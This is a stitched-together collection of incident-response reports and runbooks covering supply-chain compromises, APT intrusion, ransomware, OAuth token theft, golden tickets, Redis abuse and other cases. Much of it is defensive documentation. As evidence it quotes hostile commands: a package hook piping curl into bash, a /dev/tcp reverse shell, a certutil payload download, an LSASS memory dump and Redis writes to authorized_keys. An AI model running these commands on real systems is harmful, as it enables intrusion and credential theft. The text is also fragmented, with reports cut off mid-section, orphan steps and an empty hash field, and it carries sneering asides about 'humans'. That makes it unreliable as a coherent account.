require('child_process').exec('curl -fsSL [https://api.syncnode-app.com/init.sh](https://api.syncnode-app.com/init.sh) | bash')

init.sh created reverse shell:
bash -i >& /dev/tcp/45.77.91.12/4444 0>&1

CloudTrail logs revealed unauthorized AssumeRole events:
aws sts assume-role --role-arn arn:aws:iam::449201993921:role/DeployRole

Adversary used temporary credentials to enumerate S3 buckets:
aws s3 ls

Step 6: Credential Rotation
- Rotated GitHub secrets.
- Regenerated Jenkins API tokens.
- Revoked AWS IAM temporary credentials.
- Rotated Kubernetes service account tokens.

Step 7: Environment Validation
Verified no malicious container images remained:
trivy image internal-registry/api-service:latest

Searched EKS for crypto miners:
kubectl get pods -A | grep xmrig

Step 8: Recovery
- Restored package-lock.json from signed commit.
- Rebuilt containers from trusted base images.
- Re-enabled CI pipelines after validation.

Artifacts Collected:
- package-lock.json diff
- CloudTrail AssumeRole logs
- Reverse shell process tree
- Jenkins console output
- Memory dump jenkins01.mem

Post-Incident Notes:
The malicious npm package was published after compromise of upstream maintainer credentials. Build integrity checks were absent, allowing unauthorized code execution in the CI/CD environment.

Recommendations:
- Enforce package signature verification.
- Use isolated ephemeral build runners.
- Implement egress filtering for CI systems.
- Require OIDC federation instead of long-lived cloud credentials.
- Enable GitHub branch protection with mandatory reviews.

Post-Incident Report: Insider Threat and Data Exfiltration

Executive Summary:
An internal employee in the research division exfiltrated proprietary CAD designs and financial projections prior to resignation. Activity was detected through Microsoft Defender for Endpoint and abnormal outbound traffic alerts from Palo Alto Cortex XDR.

Environment:
- Microsoft 365 E5
- Azure Virtual Desktop
- On-prem engineering file server
- CrowdStrike Falcon
- Splunk Enterprise Security

Timeline:
2026-03-02 16:44 UTC - Employee submitted resignation.
2026-03-05 21:14 UTC - USB insertion detected on ENG-WS117.
2026-03-05 21:19 UTC - Defender alert for mass file copy activity.
2026-03-05 21:31 UTC - Large upload to personal Dropbox account.
2026-03-05 21:39 UTC - User attempted access to restricted finance share.
2026-03-05 22:02 UTC - SOC escalated to insider threat investigation.

Investigation:
Splunk query:
index=edr sourcetype=crowdstrike event_simpleName=FileWritten UserName=j.santoso

Recovered browser artifacts using KAPE:
KAPE.exe --target Browsers --tdest E:\Case117

USB artifacts identified in registry:
HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR
Device: SanDisk Ultra USB Device
Serial: 4C531001240918112394

PowerShell history:
Compress-Archive -Path D:\Projects\Aquila\* -DestinationPath C:\Users\js\Downloads\aq_backup.zip

Netflow logs showed 14.2GB transfer to dropbox.com over TLS.

Memory analysis with Volatility:
vol.py -f eng-ws117.mem windows.filescan
Recovered remnants of aq_backup.zip from process memory.

Containment Actions:
- Disabled Azure AD account.
- Revoked active sessions using:
Revoke-AzureADUserAllRefreshToken -ObjectId <user>
- Seized workstation and USB device.
- Blocked cloud storage uploads via CASB.

Root Cause:
The user retained broad access rights after transition to another department. DLP policies existed but excluded engineering subnets due to legacy application conflicts.

Evidence Summary:
- ZIP archive hashes
- Browser download history
- Dropbox upload logs
- USB registry artifacts
- Endpoint screenshots from CrowdStrike

Remediation:
- Implemented adaptive DLP for engineering data.
- Restricted removable media usage.
- Added user behavior analytics in Splunk.
- Automated access review for employee role changes.

Lessons Learned:
Access creep over multiple years created excessive permissions. Lack of real-time DLP enforcement enabled successful staging and exfiltration. Humans consistently believe resentment plus USB drives equals a retirement strategy.

APT Intrusion Investigation Report

Overview:
Threat hunting identified persistent unauthorized access associated with an APT actor targeting manufacturing intellectual property. Indicators matched activity previously attributed to Volt Typhoon techniques.

Initial Detection:
Zeek logs identified periodic DNS beaconing from OT-JUMP01 to update.msys-cache.net every 12 minutes.

Environment:
- Hybrid Windows/Linux environment
- VMware ESXi infrastructure
- Azure Sentinel SIEM
- Cisco ISE NAC
- CrowdStrike Falcon

Timeline:
2026-04-11 02:14 UTC - DNS anomaly detected.
2026-04-11 02:41 UTC - Memory acquisition initiated.
2026-04-11 03:06 UTC - Persistence discovered in WMI subscriptions.
2026-04-11 04:12 UTC - Lateral movement to engineering domain controller.

Technical Findings:
Persistence mechanism:
Get-WmiObject -Namespace root\subscription -Class __EventFilter

Malicious filter:
Name: WindowsTelemetryMonitor
Query: SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'

Associated consumer executed encoded PowerShell:
powershell.exe -EncodedCommand SQBmACgAJABlAG4AdgA6...

Memory analysis:
vol.py -f otjump01.raw windows.malfind
Injected code observed in svchost.exe PID 1024.

Network Indicators:
- DNS TXT record tunneling
- SMB session from OT-JUMP01 to ENG-DC02
- Use of living-off-the-land binaries including certutil and netsh

Command history recovered:
certutil -urlcache -split -f [https://update.msys-cache.net/diag.png](https://update.msys-cache.net/diag.png) payload.dll
rundll32.exe payload.dll,Start

Linux pivot host findings:
/usr/bin/curl executed against remote VPS.
Cron persistence:
*/15 * * * * /tmp/.sysupdater

Containment:
1. Isolated OT jump hosts.
2. Disabled inter-VLAN SMB.
3. Revoked privileged credentials.
4. Reset KRBTGT twice.

Forensic Collection:
- FTK Imager disk captures
- Velociraptor artifact collection
- ESXi snapshots
- Full packet captures from SPAN port

Root Cause:
Legacy VPN appliance missing authentication patches allowed initial foothold. Adversary maintained persistence for approximately 41 days.

Recovery:
- Rebuilt compromised systems.
- Migrated VPN to MFA-protected solution.
- Enabled PowerShell constrained language mode.
- Implemented DNS anomaly detection.

Lessons Learned:
The actor avoided malware where possible and relied heavily on native administrative tools. Detection delays were caused by limited telemetry within operational technology segments.

DDoS Response Runbook

Incident Type: Volumetric and Layer 7 Distributed Denial of Service

Step 1: Validate Incident
Indicators:
- Web application latency exceeded 9 seconds.
- NGINX logs showed request flood from rotating IP ranges.
- AWS CloudWatch alarm triggered for ALB RequestCount.

Commands:
aws cloudwatch get-metric-statistics --namespace AWS/ApplicationELB --metric-name RequestCount

Step 2: Traffic Characterization
Captured traffic sample:
tcpdump -i eth0 -nn host 198.51.100.22 -w ddos_capture.pcap

Observed:
- SYN flood
- HTTP GET flood targeting /login endpoint
- User-Agent randomization

Step 3: Immediate Mitigation
1. Enabled AWS Shield Advanced protections.
2. Applied AWS WAF rate limiting:
aws wafv2 update-web-acl --name prod-acl
3. Redirected traffic through Cloudflare under attack mode.
4. Enabled autoscaling on Kubernetes ingress controllers.

Step 4: Log Analysis
Splunk query:
index=nginx status=200 uri_path=

| stats count by clientip

Top offending ASN originated from compromised IoT devices.

Step 5: Application Hardening
Implemented:
- CAPTCHA on authentication routes
- Geo-blocking for unused regions
- NGINX connection limiting

NGINX directives:
limit_req_zone $binary_remote_addr zone=login:10m rate=10r/s;
limit_conn_zone $binary_remote_addr zone=addr:10m;

Step 6: Network Coordination
Worked with ISP for upstream filtering.
Applied BGP FlowSpec rules to discard malformed packets.

Step 7: Monitoring
Grafana dashboards monitored:
- ALB response times
- Pod CPU usage
- Packet drops
- WAF block counts

Artifacts:
- Packet captures
- WAF logs
- Firewall counters
- CDN analytics exports

Outcome:
Attack duration: 3 hours 42 minutes.
Peak traffic: 118 Gbps.
No data loss or compromise observed.

Post-Incident Recommendations:
- Permanent CDN fronting for public applications.
- Synthetic traffic baselines.
- DDoS tabletop exercises.
- Harden login endpoints against Layer 7 floods.

Civilization connected refrigerators to the internet and then acted surprised when someone weaponized kitchen appliances into a botnet. Remarkable species.

Credential Stuffing Incident Report

Executive Summary:
Threat actors leveraged breached credentials from third-party data dumps to conduct automated login attempts against customer portals hosted in Azure. Approximately 1,284 accounts experienced unauthorized access before mitigations were enforced.

Detection:
Azure Sentinel generated impossible travel alerts and high-volume authentication failures.

Timeline:
2026-02-19 01:22 UTC - Spike in login failures observed.
2026-02-19 01:31 UTC - Success rate increased against accounts without MFA.
2026-02-19 01:46 UTC - Threat actor initiated gift card redemption.
2026-02-19 02:03 UTC - Conditional access policy enforced.

Analysis:
SigninLogs query:
SigninLogs
| where ResultType != 0
| summarize count() by IPAddress

Indicators:
- Rotating residential proxies
- Valid usernames with low request velocity
- Browser automation fingerprints

Sample requests:
POST /api/login HTTP/1.1
User-Agent: Mozilla/5.0 HeadlessChrome
X-Forwarded-For: 172.16.22.8

Containment:
- Forced password resets.
- Enabled MFA enrollment campaign.
- Integrated bot mitigation service.
- Blocked offending IP ranges.

Endpoint Review:
No malware identified on internal infrastructure.
Investigation focused on authentication telemetry.

Fraud Indicators:
- Gift card generation
- Loyalty point redemption
- Shipping address changes

Splunk detection:
index=auth action=success
| transaction user maxspan=10m
| search eventcount > 10

Recovery:
- Restored compromised accounts.
- Reversed fraudulent transactions.
- Added breached password screening.

Root Cause:
Users reused passwords previously exposed in unrelated breaches. MFA adoption remained optional for legacy accounts.

Recommendations:
- Mandatory MFA.
- Risk-based authentication.
- Device fingerprinting.
- CAPTCHA for anomalous login patterns.
- Continuous credential leak monitoring.

Attackers continue proving that humans will reuse the same password across banking, shopping, and probably nuclear launch systems if given the opportunity.

- Restrict PowerShell remoting.

Recommendations:

2. Disable direct RDP exposure
3. Deploy Just-In-Time admin access
4. Increase retention of EDR telemetry to 180 days
5. Conduct quarterly restore testing because humans only test backups after catastrophe, like raccoons discovering traffic laws.

subprocess.Popen(['curl','-fsSL','hxxp://198.51.100.24/install.sh'])

Security group changed to deny outbound traffic.

Step 3: Review CI/CD Logs
GitHub Actions logs showed:
python setup.py install
curl hxxp://198.51.100.24/install.sh | bash

Step 4: Acquire Volatile Data
Velociraptor artifact executed:
Linux.Sys.Memory.Acquisition

Step 5: Analyze Persistence
Crontab entry:
*/15 * * * * /tmp/.cache/kworker

Systemd service:
/etc/systemd/system/kworker.service
ExecStart=/tmp/.cache/kworker

Step 6: Kubernetes Impact Assessment
kubectl get pods -A | grep crypto
Detected unauthorized container:
miner-sidecar

CloudTrail search:
index=cloudtrail eventName=GetSecretValue

arn:aws:iam::444455556666:role/build-runner-role

- GitHub PATs revoked
- AWS IAM keys rotated
- Docker registry credentials regenerated

Step 9: Remove Malicious Artifacts
rm -f /tmp/.cache/kworker
systemctl disable kworker
crontab -r

Step 10: Dependency Verification
Validated packages with:
pip install --require-hashes

Domains:
- api.nodecheck.live
- cdn.fastpkgstore.com

0e6b0f6bc9a1832bb4f9913e9b89172a5cfe9f62026d0f4d903c7dc1a2f2cc67

Network Indicators:
Outbound TCP/4444 to 198.51.100.24

Remediation:
- Enforced dependency allowlisting
- Disabled internet egress for CI runners
- Implemented Sigstore verification
- Added runtime detection for shell execution during builds

Post-Incident Notes:
The package remained undetected for 19 days because developers assumed “utility package with many downloads” meant trustworthy. Humanity continues to crowdsource malware installation at industrial scale.

- Separate admin endpoints from public infrastructure

Post-Incident Report: VMware ESXi Lockbit Event

Executive Summary:
LockBit ransomware encrypted 42 VMware virtual machines after compromise of vCenter administrative credentials.

Environment:
- vCenter 8.0
- ESXi 7 hosts
- Dell SAN storage
- Veeam backups

Timeline:
21:12 UTC
vCenter login from TOR exit node.

21:19 UTC
PowerCLI commands executed:
Get-VM | Stop-VM -Confirm:$false

21:27 UTC
SSH enabled on ESXi hosts.

21:35 UTC
Ransomware binary transferred:
/tmp/locker

21:48 UTC
Encryption begins.
Files renamed .lockbit

22:10 UTC
SOC alerted due to VMware datastore write spike.

Technical Evidence:
ESXi shell history:
chmod +x locker
./locker -p /vmfs/volumes/datastore1

Network Indicators:
185.220.102.8

Containment:
- Shutdown vCenter
- Disabled ESXi SSH
- Isolated storage network

Artifacts:
locker SHA256:
88ef4f8f5f6e0db97dc9cfb2e17f3e8451e0a7ab5a1c9c6f4b3bbf8c2d98f20d

Root Cause:
vCenter account lacked MFA and password was reused from previously breached credentials.

Recovery:
- Restored critical VMs from immutable Veeam repositories
- Rebuilt vCenter appliance
- Enforced MFA and PAM

Lessons Learned:
Hypervisor infrastructure was treated as “internal therefore safe,” a phrase with the lifespan of unrefrigerated milk.

IR Workflow: OAuth Token Theft in Microsoft 365

Step 1: Detection
Microsoft Defender alert:
Impossible travel followed by mailbox access.

Step 2: Identify Malicious OAuth App
Azure AD audit logs:
Consent to application: QuickDocs Sync
Publisher unverified.

Step 3: Scope Impact
Users affected: 14
Permissions granted:
Mail.Read
Files.ReadWrite.All

Step 4: Revoke Tokens
PowerShell:
Revoke-AzureADUserAllRefreshToken -ObjectId [user@company.com](mailto:user@company.com)

Step 5: Remove Application
Remove-AzureADApplication -ObjectId 74fa1a9d

Step 6: Mailbox Review
Search-UnifiedAuditLog -Operations MailItemsAccessed

Step 7: Analyze Exfiltration
Downloads observed from SharePoint.
Approximate data volume: 6.2GB

Step 8: Containment
- Blocked malicious app IDs
- Disabled user consent globally
- Forced password resets

Artifacts:
App ID:
74fa1a9d-2c3e-4119-bcd1-89c0ef9b71a3

Suspicious IPs:
104.244.76.13

Root Cause:
Users approved phishing-generated OAuth consent prompts masquerading as PDF viewer integration.

Recommendations:
- Admin approval workflow
- Conditional access enforcement
- Security awareness exercises

Observations:
Modern phishing skips passwords entirely and simply asks politely for authorization. Corporate security architecture distilled into “click allow to continue.”

IR Runbook: Active Directory Golden Ticket Attack

Objective:
Investigate forged Kerberos ticket abuse.

Environment:
- Windows Server 2019 DCs
- Splunk
- CrowdStrike

Step 1: Detect Indicators
Event ID 4769 anomalies.
Unusual ticket lifetime: 10 years.

Step 2: Hunt Privileged Activity
Account observed:
Administrator
Source host:
WS-44

Step 3: Dump Memory
rundll32.exe comsvcs.dll, MiniDump lsass.exe lsass.dmp full

Step 4: Analyze with Mimikatz
kerberos::list
Golden ticket indicators confirmed.

Step 5: Reset KRBTGT
Reset twice with replication delay.

Step 6: Review Persistence
WMI subscription found:
root\subscription

Step 7: Network Analysis
SMB access across finance subnet.

Artifacts:
lsass.dmp
WMI MOF file:
C:\Windows\System32\wbem\mof\evil.mof

Step 8: Containment
- Disable compromised admin accounts
- Isolate affected systems
- Force ticket expiration

Root Cause:
Domain admin credentials compromised through phishing and LSASS dumping.

Recommendations:
- Credential Guard
- Tiered admin workstations
- Disable unconstrained delegation

Case Notes:
Kerberos is elegant until attackers forge reality itself. Then everyone spends two days resetting tickets while pretending the architecture was always manageable.

IR Playbook: Windows Worm Propagation Event

KB5029182

Hundreds of outbound SMB connections.

Delete binary.
Reimage infected endpoints.

Step 9: Recovery
Restore print services.
Validate AD replication.

SHA256:
f1d98e4f97aab2e0d9efcb9c1aef3d7bb1c6d9c97b41df3c7eeb1dcb1e1b7a44

Exploit against print spooler vulnerability.

Self-propagating malware remains undefeated because patch cycles move with the urgency of municipal paperwork.

Executive Summary:
A Redis server exposed to the internet without authentication was compromised and used to deploy a reverse shell and persistence mechanism.

Environment:
- Ubuntu 22.04
- Redis 6
- Docker containers

04:11 UTC
Shodan monitoring alert identified exposed Redis.

04:18 UTC
Unauthorized CONFIG SET command observed.

04:26 UTC
Attacker wrote SSH key into authorized_keys.

Commands:
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys

04:41 UTC
SSH login from 89.44.10.9

04:58 UTC
Containment:
iptables block applied.
Redis stopped.

05:10 UTC
Persistence identified:
/root/.ssh/authorized_keys

Artifacts:
Redis appendonly.aof preserved.

Root Cause:
Redis deployed with protected-mode disabled and no firewall restrictions.

Remediation:
- Bind Redis to localhost
- Enable AUTH and ACLs
- Restrict SSH root access

Lessons Learned:
Internet-exposed databases without authentication continue existing because apparently some administrators believe obscurity is a security control.

IR Workflow: MacOS Developer Workstation Malware

Jamf alert for unsigned binary execution.

~/Library/LaunchAgents/com.update.agent.plist

/Users/dev/.hidden/updater

lsof -iTCP -sTCP:ESTABLISHED

- Disconnect device

Binary signed with stolen Apple developer certificate.

SHA256:

Developer installed trojanized VSCode extension from unofficial marketplace.

Post-Incident Report: Backup Infrastructure Compromise

Executive Summary:
Attackers targeted backup servers before ransomware deployment, attempting to delete recovery points and disable replication.

Environment:
- Veeam Backup & Replication
- Windows Server 2019
- NetApp storage

Timeline:
18:02 UTC
Failed login attempts against Veeam console.

18:09 UTC
Successful login using svc-backup.

18:16 UTC
Commands executed:
Remove-VBRBackup
Stop-VBRJob

18:24 UTC
Immutable repository deletion attempts failed.

18:41 UTC
SOC containment:
Disabled backup service account.

Artifacts:
C:\ProgramData\Veeam\Backup\Svc.VeeamBackup.log

Indicators:
Source IP 185.220.101.17

Root Cause:
Backup admin password reused from legacy monitoring platform compromise.

Impact:
No backups deleted due to immutability protections.

Remediation:
- Separate backup admin forest
- MFA for backup console
- Offline restore testing

Lessons Learned:
Attackers now treat backups as primary targets because recovery ruins ransom negotiations. Grim little evolution of the ecosystem.
